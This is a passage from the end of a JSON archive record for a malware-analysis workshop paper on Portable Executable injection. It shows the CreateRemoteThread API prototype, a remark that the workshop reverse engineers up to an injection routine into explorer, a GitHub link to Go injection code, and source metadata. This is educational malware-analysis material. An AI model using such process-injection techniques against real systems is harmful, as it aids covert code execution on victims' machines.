Prototype**\n```\nHANDLE CreateRemoteThread(\n HANDLE         hProcess,\n LPSECURITY_ATTRIBUTES lpThreadAttributes,\n SIZE_T         dwStackSize,\n LPTHREAD_START_ROUTINE lpStartAddress,\n LPVOID         lpParameter,\n DWORD         dwCreationFlags,\n LPDWORD        lpThreadId\n);\n\n```\n\n-----\n\nThe intent of this workshop is to reverse engineer just enough to get you to the injection\nroutine into explorer. Enjoy reversing!\n\nSpecial thanks to reviewer Athena Cheung.\n\nHere is the full golang code:\n\n[https://github.com/malware-unicorn/GoPEInjection](https://github.com/malware-unicorn/GoPEInjection)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-26 - Portable Executable Injection Study.pdf"
    ],
    "report_names": [
        "2021-07-26 - Portable Executable Injection Study.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536165,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1653785950,
    "ts_modification_date": 1653785950,
    "files": {
        "pdf": "https://archive.orkl.eu/a7e14dd45b01b7149e4722988fac490b2b65c82e.pdf",
        "text": "https://archive.orkl.eu/a7e14dd45b01b7149e4722988fac490b2b65c82e.txt",
        "img": "https://archive.orkl.eu/a7e14dd45b01b7149e4722988fac490b2b65c82e.jpg"
    }
}